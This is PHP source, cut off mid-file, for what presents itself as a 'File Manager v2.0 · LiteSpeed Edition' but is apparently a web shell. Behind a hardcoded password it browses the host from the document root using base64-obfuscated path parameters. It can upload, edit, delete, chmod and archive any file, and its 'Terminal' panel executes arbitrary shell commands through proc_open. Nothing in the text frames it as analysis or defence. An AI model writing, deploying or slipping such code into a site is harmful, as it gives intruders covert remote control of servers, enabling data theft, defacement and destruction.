<?php
session_start();

// ── Authentication ──────────────────────────────────────────
define('FM_PASSWORD_HASH', password_hash('Lanciao123@@##', PASSWORD_BCRYPT));
$authError = '';

if (isset($_POST['fm_logout'])) {
    $_SESSION['fm_auth'] = false;
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['fm_password'])) {
    if (password_verify((string) $_POST['fm_password'], FM_PASSWORD_HASH)) {
        $_SESSION['fm_auth'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    $authError = 'Incorrect password. Please try again.';
}
if (empty($_SESSION['fm_auth'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager — Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script>tailwind.config={theme:{extend:{fontFamily:{sans:['Plus Jakarta Sans','sans-serif'],mono:['JetBrains Mono','monospace']},animation:{'slide-up':'slideUp 0.3s ease-out'},keyframes:{slideUp:{from:{opacity:'0',transform:'translateY(16px)'},to:{opacity:'1',transform:'translateY(0)'}}}}}}</script>
    <style>body{font-family:'Plus Jakarta Sans',sans-serif;}</style>
</head>
<body class="bg-[#080f1f] min-h-screen flex items-center justify-center p-4">
<div class="absolute inset-0 bg-[linear-gradient(rgba(59,130,246,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(59,130,246,0.03)_1px,transparent_1px)] bg-[size:40px_40px] pointer-events-none"></div>
<div class="relative w-full max-w-sm animate-slide-up">
    <div class="bg-[#0f172a] border border-slate-700/50 rounded-2xl shadow-2xl overflow-hidden">
        <div class="h-1 bg-gradient-to-r from-blue-600 via-blue-400 to-cyan-400"></div>
        <div class="px-8 py-8">
            <div class="flex flex-col items-center mb-8">
                <div class="w-14 h-14 rounded-2xl bg-blue-500/10 border border-blue-500/25 flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-7 h-7 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg>
                </div>
                <h1 class="text-xl font-bold text-slate-100">File Manager</h1>
                <p class="text-xs text-slate-500 mt-1 font-mono">v2.0 · LiteSpeed Edition</p>
            </div>
            <?php if ($authError !== '' && $authError !== '0'): ?>
            <div class="flex items-center gap-2 px-4 py-3 mb-5 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-sm">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                <?php echo htmlspecialchars($authError); ?>
            </div>
            <?php endif; ?>
            <form method="post">
                <label class="block text-xs font-medium text-slate-400 mb-2">Password</label>
                <div class="relative mb-6">
                    <input type="password" name="fm_password" id="fm_password" required autofocus placeholder="Enter password"
                        class="w-full px-4 py-3 pr-11 font-mono text-sm bg-slate-800/60 border border-slate-700/50 rounded-xl text-slate-200 placeholder-slate-600 focus:outline-none focus:border-blue-500/60 focus:bg-slate-800 transition-all">
                    <button type="button" onclick="togglePw()" class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition-colors" tabindex="-1">
                        <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                            <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                        </svg>
                    </button>
                </div>
                <button type="submit" class="w-full py-3 text-sm font-semibold text-white bg-blue-600 hover:bg-blue-500 rounded-xl transition-all duration-150 shadow-lg shadow-blue-500/20">Sign In</button>
            </form>
        </div>
    </div>
    <p class="text-center text-xs text-slate-700 mt-5 font-mono"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown Server'); ?></p>
</div>
<script>
function togglePw(){const i=document.getElementById('fm_password'),e=document.getElementById('eyeIcon');if(i.type==='password'){i.type='text';e.innerHTML='<path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>';}else{i.type='password';e.innerHTML='<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>';}}
</script>
</body></html>
<?php exit; }
// ── End Auth ────────────────────────────────────────────────

$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = __DIR__;

function x($b): string{return base64_encode((string) $b);}
function y($b): string{return base64_decode((string) $b);}
foreach($_GET as $c=>$d) $_GET[$c]=y($d);

$currentDirectory = realpath($_GET['d'] ?? $rootDirectory);
chdir($currentDirectory);

$viewCommandResult=''; $statusMessage=''; $statusType='';
$editorLoad = null; // for pre-loading editor content

if($_SERVER['REQUEST_METHOD']==='POST'){

    if(isset($_FILES['fileToUpload'])){
        $t=$currentDirectory.'/'.basename((string) $_FILES["fileToUpload"]["name"]);
        if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],$t)){$statusMessage='File "'.htmlspecialchars(basename((string) $_FILES["fileToUpload"]["name"])).'" uploaded';$statusType='success';}
        else{$statusMessage='Failed to upload';$statusType='error';}

    }elseif(isset($_POST['folder_name'])&&!empty($_POST['folder_name'])){
        $nf=$currentDirectory.'/'.$_POST['folder_name'];
        if(!file_exists($nf)){mkdir($nf);$statusMessage='Folder created';$statusType='success';}
        else{$statusMessage='Folder already exists';$statusType='error';}

    }elseif(isset($_POST['file_name'])&&!empty($_POST['file_name'])){
        $nf=$currentDirectory.'/'.$_POST['file_name'];
        $ex=file_exists($nf);
        if(file_put_contents($nf,$_POST['file_content'])!==false){$statusMessage=$ex?'File saved':'File created';$statusType='success';}
        else{$statusMessage='Failed to save file';$statusType='error';}

    }elseif(isset($_POST['delete_file'])){
        $t=$currentDirectory.'/'.$_POST['delete_file'];
        if(file_exists($t)){$ok=is_dir($t)?deleteDirectory($t):unlink($t);$statusMessage=$ok?'Deleted':'Failed to delete';$statusType=$ok?'success':'error';}
        else{$statusMessage='Not found';$statusType='error';}

    }elseif(isset($_POST['bulk_delete'])&&!empty($_POST['selected_items'])){
        $del=0;$fail=0;
        foreach($_POST['selected_items'] as $item){
            $t=$currentDirectory.'/'.basename((string) $item);
            if(file_exists($t)){$ok=is_dir($t)?deleteDirectory($t):unlink($t);$ok?$del++:$fail++;}
        }
        $statusMessage=sprintf('Deleted %d item(s)', $del).($fail !== 0?sprintf(', %d failed', $fail):'');
        $statusType=$fail !== 0?'error':'success';

    }elseif(isset($_POST['rename_item'])&&isset($_POST['old_name'])&&isset($_POST['new_name'])){
        $on=$currentDirectory.'/'.$_POST['old_name'];
        $nn=$currentDirectory.'/'.$_POST['new_name'];
        if(file_exists($on)){if(rename($on,$nn)){$statusMessage='Renamed successfully';$statusType='success';}else{$statusMessage='Rename failed';$statusType='error';}}
        else{$statusMessage='Not found';$statusType='error';}

    }elseif(isset($_POST['chmod_file'])&&isset($_POST['chmod_value'])){
        $t=$currentDirectory.'/'.basename((string) $_POST['chmod_file']);
        $mode=octdec((string) $_POST['chmod_value']);
        if(file_exists($t)&&chmod($t,$mode)){$statusMessage='Permissions changed to '.$_POST['chmod_value'];$statusType='success';}
        else{$statusMessage='chmod failed';$statusType='error';}

    }elseif(isset($_POST['zip_file'])){
        $t=$currentDirectory.'/'.basename((string) $_POST['zip_file']);
        $zn=$currentDirectory.'/'.basename((string) $_POST['zip_file']).'.zip';
        if(class_exists('ZipArchive')){
            $zip=new ZipArchive();
            if($zip->open($zn,ZipArchive::CREATE)===TRUE){
                if(is_dir($t)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t,RecursiveDirectoryIterator::SKIP_DOTS));foreach($it as $f)$zip->addFile($f->getRealPath(),basename($t).'/'.$it->getSubPathname());}
                else{$zip->addFile($t,basename($t));}
                $zip->close();$statusMessage='Zipped as '.basename($zn);$statusType='success';
            }else{$statusMessage='Failed to create zip';$statusType='error';}
        }else{$statusMessage='ZipArchive not available';$statusType='error';}

    }elseif(isset($_POST['extract_file'])){
        $zp=$currentDirectory.'/'.basename((string) $_POST['extract_file']);
        if(class_exists('ZipArchive')){
            $zip=new ZipArchive();
            if($zip->open($zp)===TRUE){
                $to=$currentDirectory.'/'.pathinfo(basename($zp),PATHINFO_FILENAME);
                $zip->extractTo($to);$zip->close();
                $statusMessage='Extracted to /'.basename($to);$statusType='success';
            }else{$statusMessage='Failed to open zip';$statusType='error';}
        }else{$statusMessage='ZipArchive not available';$statusType='error';}

    }elseif(isset($_POST['cmd_input'])){
        $cmd=$_POST['cmd_input'];
        $ds=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $proc=proc_open($cmd,$ds,$pipes);
        if(is_resource($proc)){
            $out=stream_get_contents($pipes[1]);$err=stream_get_contents($pipes[2]);
            fclose($pipes[1]);fclose($pipes[2]);proc_close($proc);
            $viewCommandResult=['type'=>'command','label'=>'$ '.htmlspecialchars((string) $cmd),'content'=>htmlspecialchars(in_array($err, ['', '0', false], true)?$out:$err),'filename'=>''];
        }else{$statusMessage='Failed to execute command';$statusType='error';}

    }elseif(isset($_POST['view_file'])){
        $fv=$currentDirectory.'/'.$_POST['view_file'];
        if(file_exists($fv)){
            $viewCommandResult=['type'=>'view','label'=>'Viewing: '.htmlspecialchars((string) $_POST['view_file']),'content'=>htmlspecialchars(file_get_contents($fv)),'filename'=>$_POST['view_file']];
        }else{$statusMessage='File not found';$statusType='error';}

    }elseif(isset($_POST['editor_load'])){
        $fv=$currentDirectory.'/'.$_POST['editor_load'];
        if(file_exists($fv)){
            $editorLoad=['filename'=>$_POST['editor_load'],'content'=>file_get_contents($fv)];
        }
    }
}

function deleteDirectory($dir){
    if(!file_exists($dir))return true;if(!is_dir($dir))return unlink($dir);
    foreach(scandir($dir) as $i){if ($i === '.') {
        continue;
    }
    if ($i === '..') {
        continue;
    }
    if(!deleteDirectory($dir.DIRECTORY_SEPARATOR.$i))return false;}
    return rmdir($dir);
}
function formatFileSize($b): string{
    if ($b>=1073741824) {
        return number_format($b/1073741824,2).' GB';
    }
    if ($b>=1048576) {
        return number_format($b/1048576,2).' MB';
    }
    if ($b>=1024) {
        return number_format($b/1024,2).' KB';
    }
    if ($b>1) {
        return $b.' bytes';
    }
    if ($b==1) {
        return '1 byte';
    }
    return '0 bytes';
}
function extColor($e): string{
    $m=['php'=>'text-violet-400','js'=>'text-yellow-400','ts'=>'text-blue-400','html'=>'text-orange-400','htm'=>'text-orange-400','css'=>'text-cyan-400','json'=>'text-yellow-300','xml'=>'text-orange-300','sql'=>'text-emerald-400','py'=>'text-blue-300','sh'=>'text-green-400','bash'=>'text-green-400','txt'=>'text-slate-400','md'=>'text-slate-300','zip'=>'text-purple-400','tar'=>'text-purple-400','gz'=>'text-purple-300','jpg'=>'text-pink-400','jpeg'=>'text-pink-400','png'=>'text-pink-400','gif'=>'text-pink-400','svg'=>'text-pink-300','pdf'=>'text-red-400','log'=>'text-amber-400'];
    return $m[$e]??'text-slate-400';
}
function extLang($e): string{
    $m=['php'=>'php','js'=>'javascript','ts'=>'typescript','html'=>'html','htm'=>'html','css'=>'css','json'=>'json','xml'=>'xml','sql'=>'sql','py'=>'python','sh'=>'bash','bash'=>'bash','md'=>'markdown'];
    return $m[$e]??'plaintext';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script>
        tailwind.config={theme:{extend:{fontFamily:{sans:['Plus Jakarta Sans','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{surface:{900:'#0f172a',950:'#080f1f'}},animation:{'slide-up':'slideUp 0.25s ease-out'},keyframes:{slideUp:{from:{opacity:'0',transform:'translateY(12px)'},to:{opacity:'1',transform:'translateY(0)'}}}}}}
    </script>
    <style>
        body{font-family:'Plus Jakarta Sans',sans-serif;}
        .mono{font-family:'JetBrains Mono',monospace;}
        ::-webkit-scrollbar{width:4px;height:4px;}
        ::-webkit-scrollbar-track{background:transparent;}
        ::-webkit-scrollbar-thumb{background:#475569;border-radius:2px;}
        .modal-open{overflow:hidden;}
        .hljs{background:transparent!important;padding:16px!important;}
        #hlCode{font-family:'JetBrains Mono',monospace!important;font-size:12px;}
    </style>
</head>
<body class="bg-surface-950 text-slate-100 min-h-screen">

<?php
// If editor load was requested, output it as JS variable
if($editorLoad!==null){
    echo '<script>window._editorAutoLoad='.json_encode(['filename'=>$editorLoad['filename'],'content'=>$editorLoad['content']]).';</script>';
}
?>

<!-- NAVBAR -->
<nav class="bg-surface-900 border-b border-slate-700/50 sticky top-0 z-40 backdrop-blur-sm">
    <div class="max-w-7xl mx-auto px-4 sm:px-6">
        <div class="flex items-center justify-between h-16">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-blue-500/20 border border-blue-500/30 flex items-center justify-center">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg>
                </div>
                <span class="font-semibold text-slate-100 text-sm hidden sm:block">File Manager</span>
                <span class="text-xs text-slate-500 hidden sm:block mono">v2.0</span>
            </div>
            <div class="hidden md:flex items-center gap-1">
                <button type="button" onclick="openModal('createFolderModal')" class="flex items-center gap-1.5 px-3 py-2 rounded-lg text-sm font-medium text-slate-300 hover:text-white hover:bg-slate-700/60 transition-all">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg>New Folder
                </button>
                <button type="button" onclick="openModal('createEditFileModal')" class="flex items-center gap-1.5 px-3 py-2 rounded-lg text-sm font-medium text-slate-300 hover:text-white hover:bg-slate-700/60 transition-all">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>Create/Edit
                </button>
                <button type="button" onclick="openModal('uploadFileModal')" class="flex items-center gap-1.5 px-3 py-2 rounded-lg text-sm font-medium text-slate-300 hover:text-white hover:bg-slate-700/60 transition-all">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>Upload
                </button>
                <div class="w-px h-5 bg-slate-700 mx-1"></div>
                <button type="button" onclick="openModal('runCommandModal')" class="flex items-center gap-1.5 px-3 py-2 rounded-lg text-sm font-medium bg-rose-500/10 text-rose-400 border border-rose-500/20 hover:bg-rose-500/20 hover:border-rose-500/40 transition-all">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>Terminal
                </button>
                <div class="w-px h-5 bg-slate-700 mx-1"></div>
                <form method="post">
                    <button type="submit" name="fm_logout" value="1" class="flex items-center gap-1.5 px-3 py-2 rounded-lg text-sm font-medium text-slate-400 hover:text-white hover:bg-slate-700/60 transition-all">
                        <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
                        <span class="hidden lg:inline">Logout</span>
                    </button>
                </form>
            </div>
            <button type="button" onclick="toggleMobileMenu()" class="md:hidden p-2 rounded-lg text-slate-400 hover:text-white hover:bg-slate-700/60 transition-all">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"/></svg>
            </button>
        </div>
    </div>
    <div id="mobileMenu" class="hidden md:hidden border-t border-slate-700/50">
        <div class="px-4 py-3 grid grid-cols-2 gap-2">
            <button type="button" onclick="openModal('createFolderModal');closeMobileMenu()" class="flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-300 bg-slate-800/60 hover:bg-slate-700/60 transition-all"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg>New Folder</button>
            <button type="button" onclick="openModal('createEditFileModal');closeMobileMenu()" class="flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-300 bg-slate-800/60 hover:bg-slate-700/60 transition-all"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>Create/Edit</button>
            <button type="button" onclick="openModal('uploadFileModal');closeMobileMenu()" class="flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-300 bg-slate-800/60 hover:bg-slate-700/60 transition-all"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>Upload</button>
            <button type="button" onclick="openModal('runCommandModal');closeMobileMenu()" class="flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm font-medium text-rose-400 bg-rose-500/10 border border-rose-500/20 hover:bg-rose-500/20 transition-all"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>Terminal</button>
        </div>
        <div class="px-4 pb-3">
            <form method="post"><button type="submit" name="fm_logout" value="1" class="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 bg-slate-800/60 hover:bg-slate-700/60 transition-all"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>Logout</button></form>
        </div>
    </div>
</nav>

<!-- MAIN -->
<main class="max-w-7xl mx-auto px-4 sm:px-6 py-6">

    <!-- Server info -->
    <div class="flex flex-wrap items-center gap-3 mb-5 text-xs mono text-slate-500">
        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']??'Unknown'); ?></span>
        <span class="text-slate-700">|</span><span><?php echo $timezone; ?></span>
        <span class="text-slate-700">|</span><span><?php echo date('Y-m-d H:i:s'); ?></span>
    </div>

    <!-- Status -->
    <?php if($statusMessage !== '' && $statusMessage !== '0'): ?>
    <div id="statusMsg" class="mb-5 flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium animate-slide-up transition-opacity duration-500 <?php echo $statusType==='success'?'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20':'bg-rose-500/10 text-rose-400 border border-rose-500/20'; ?>">
        <?php if($statusType==='success'): ?><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg><?php else: ?><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg><?php endif; ?>
        <?php echo htmlspecialchars($statusMessage); ?>
    </div>
    <?php endif; ?>

    <!-- Breadcrumb -->
    <div class="mb-5 flex items-center gap-1 flex-wrap bg-surface-900 border border-slate-700/50 px-4 py-2.5 rounded-xl text-sm overflow-x-auto">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5 text-slate-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
        <?php
        $bdirs=explode(DIRECTORY_SEPARATOR,$currentDirectory);$cp='';
        foreach($bdirs as $bd){if($bd==='')continue;$cp.=DIRECTORY_SEPARATOR.$bd;echo '<span class="text-slate-600">/</span><a href="?d='.x($cp).'" class="mono text-xs text-slate-400 hover:text-blue-400 px-1 py-0.5 rounded hover:bg-blue-500/10 transition-all whitespace-nowrap">'.htmlspecialchars($bd).'</a>';}
        echo '<span class="text-slate-600">/</span><a href="?d='.x($scriptDirectory).'" class="mono text-xs text-emerald-400 hover:text-emerald-300 px-1 py-0.5 rounded hover:bg-emerald-500/10 transition-all font-medium whitespace-nowrap">[home]</a>';
        ?>
    </div>

    <!-- Result / View box -->
    <?php if($viewCommandResult): ?>
    <?php
        // Store raw file content safely for JS editor - use a hidden textarea to avoid any inline JS injection
        $rawFileContent = ($viewCommandResult['type']==='view') ? file_get_contents($currentDirectory.'/'.$viewCommandResult['filename']) : '';
        $viewFilename   = ($viewCommandResult['type']==='view') ? $viewCommandResult['filename'] : '';
    ?>
    <?php if($viewFilename!==''): ?>
    <textarea id="resultRawContent" class="hidden"><?php echo htmlspecialchars($rawFileContent, ENT_QUOTES, 'UTF-8'); ?></textarea>
    <?php endif; ?>
    <div class="mb-6 bg-surface-900 border border-slate-700/50 rounded-xl overflow-hidden animate-slide-up" id="resultBox">
        <div class="flex items-center justify-between px-4 py-2.5 bg-slate-800/50 border-b border-slate-700/50">
            <div class="flex items-center gap-2">
                <div class="flex gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-rose-500/70"></div><div class="w-2.5 h-2.5 rounded-full bg-amber-500/70"></div><div class="w-2.5 h-2.5 rounded-full bg-emerald-500/70"></div></div>
                <span class="text-xs mono text-slate-400"><?php echo $viewCommandResult['label']; ?></span>
            </div>
            <div class="flex items-center gap-2">
                <?php if($viewCommandResult['type']==='view'&&$viewFilename!==''): ?>
                <button type="button" onclick="openEditorFromResultBox()" data-filename="<?php echo htmlspecialchars((string) $viewFilename, ENT_QUOTES, 'UTF-8'); ?>" class="text-xs px-2.5 py-1 rounded-lg bg-violet-500/15 text-violet-400 border border-violet-500/20 hover:bg-violet-500/25 transition-all mono">Edit</button>
                <?php endif; ?>
                <button type="button" onclick="document.getElementById('resultBox').remove()" class="text-slate-500 hover:text-slate-300 transition-colors text-xl leading-none">&times;</button>
            </div>
        </div>
        <?php if($viewCommandResult['type']==='view'): ?>
        <pre class="overflow-auto max-h-96"><code class="language-<?php echo htmlspecialchars((string) extLang(strtolower(pathinfo((string) $viewFilename,PATHINFO_EXTENSION)))); ?> text-xs"><?php echo $viewCommandResult['content']; ?></code></pre>
        <?php else: ?>
        <textarea readonly class="w-full bg-transparent mono text-xs text-slate-300 p-4 resize-y min-h-40 focus:outline-none"><?php echo $viewCommandResult['content']; ?></textarea>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <!-- Hidden bulk delete form (outside table to avoid nested forms) -->
    <form method="post" id="bulkForm">
        <input type="hidden" name="bulk_delete" value="1">
        <div id="bulkItemsContainer"></div>
    </form>

    <!-- File Table -->
    <div class="bg-surface-900 border border-slate-700/50 rounded-xl overflow-hidden">

        <!-- Bulk bar -->
        <div id="bulkBar" class="hidden items-center gap-3 px-4 py-2.5 bg-blue-500/10 border-b border-blue-500/20">
            <span class="text-sm text-blue-400 font-medium"><span id="selectedCount">0</span> selected</span>
            <button type="button" onclick="submitBulkDelete()"
                class="flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold bg-rose-500/15 text-rose-400 border border-rose-500/25 rounded-lg hover:bg-rose-500/25 transition-all">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                Delete Selected
            </button>
            <button type="button" onclick="clearSel()" class="text-xs text-slate-500 hover:text-slate-300 transition-colors">Clear</button>
        </div>

        <div class="overflow-x-auto">
            <table class="w-full text-sm">
                <thead>
                    <tr class="bg-slate-800/60 text-slate-400 text-xs uppercase tracking-wider">
                        <th class="px-3 py-3 w-8 text-center"><input type="checkbox" id="checkAll" onchange="toggleAll(this)" class="w-4 h-4 rounded cursor-pointer" style="accent-color:#3b82f6"></th>
                        <th class="text-left px-3 py-3 font-semibold min-w-[160px]">Name</th>
                        <th class="text-left px-3 py-3 font-semibold hidden sm:table-cell">Size</th>
                        <th class="text-left px-3 py-3 font-semibold hidden md:table-cell">Modified</th>
                        <th class="text-left px-3 py-3 font-semibold hidden lg:table-cell">Perms</th>
                        <th class="text-center px-2 py-3 font-semibold" title="View">👁</th>
                        <th class="text-center px-2 py-3 font-semibold" title="Code Editor">✏️</th>
                        <th class="text-center px-2 py-3 font-semibold" title="Zip/Extract">📦</th>
                        <th class="text-center px-2 py-3 font-semibold" title="Chmod">🔑</th>
                        <th class="text-center px-2 py-3 font-semibold" title="Delete">🗑</th>
                        <th class="text-left px-2 py-3 font-semibold min-w-[150px]">Rename</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-slate-800/80">
                <?php
                $rawItems=array_diff(scandir($currentDirectory),['.','..']);
                $fD=[];$fF=[];
                foreach($rawItems as $item){is_dir($currentDirectory.'/'.$item)?$fD[]=$item:$fF[]=$item;}
                natcasesort($fD);natcasesort($fF);
                $allItems=array_merge(array_values($fD),array_values($fF));

                foreach($allItems as $v):
                    $u=realpath($v);
                    $isDir=is_dir($v);
                    $isWr=is_writable($u);
